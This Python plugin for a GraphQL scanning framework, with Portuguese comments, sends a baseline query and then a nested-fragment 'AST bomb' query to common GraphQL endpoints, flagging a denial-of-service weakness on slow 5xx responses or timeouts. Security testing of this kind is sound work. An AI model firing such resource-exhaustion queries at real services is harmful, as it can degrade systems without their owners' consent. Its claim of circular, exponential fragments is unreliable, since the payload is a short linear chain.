"""
[+] Plugin: GraphQL AST Bomb (API DoS)
[+] Description: Injeção de fragmentos circulares no GraphQL causando O(2^N)
[+] Category: API Security
[+] CVSS: 7.5 (High)
[+] Author: CASCAVEL Framework
"""

import time

import requests


def run(target, ip, ports, banners):
    finding = None
    endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
    base_url = f"https://{target}" if target else f"http://{ip}"

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Cascavel-GraphQL-Probe/3.0.1"
    }

    # Payload desenhado para estourar o AST Depth e o Resolving Engine
    # Se o limitador de depth não estiver ativo, isso trava o server.
    bomb_payload = {
        "query": "query { ...a } fragment a on Query { ...b } fragment b on Query { ...c } fragment c on Query { ...d } fragment d on Query { __typename }"
    }

    baseline_payload = {
        "query": "{ __typename }"
    }

    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        try:
            # 1. Medir latência Baseline
            t0 = time.time()
            baseline_resp = requests.post(url, json=baseline_payload, headers=headers, timeout=5, verify=False)
            baseline_time = time.time() - t0

            # Se não retornar 200 pro typename, não é um endpoint graphql válido ou exige auth.
            if baseline_resp.status_code != 200 or "data" not in baseline_resp.json():
                continue

            # 2. Enviar a Bomba AST
            t1 = time.time()
            bomb_resp = requests.post(url, json=bomb_payload, headers=headers, timeout=10, verify=False)
            bomb_time = time.time() - t1

            # Se a bomba demorar 5x mais que o baseline e retornar Erro HTTP 50x (e não apenas bloqueio WAF 4xx)
            if bomb_time > (baseline_time * 5) and bomb_resp.status_code >= 500:
                 finding = {
                    "vulnerability": "GraphQL AST Overload DoS",
                    "severity": "HIGH",
                    "description": f"Endpoint GraphQL vulnerável à exaustão de recursos do AST. Um request intencionalmente complexo elevou o tempo de resposta de {baseline_time:.2f}s para {bomb_time:.2f}s, resultando em erro {bomb_resp.status_code}.",
                    "endpoint": endpoint,
                    "payload": bomb_payload["query"]
                }
                 break

        except requests.exceptions.Timeout:
             # Timeout também indica que a bomba funcionou.
             finding = {
                    "vulnerability": "GraphQL AST Overload DoS (Timeout)",
                    "severity": "HIGH",
                    "description": "Endpoint GraphQL sucumbiu a injeção de fragmento, resultando em Timeout da conexão.",
                    "endpoint": endpoint,
                    "payload": bomb_payload["query"]
             }
             break
        except Exception:
            pass

    return finding
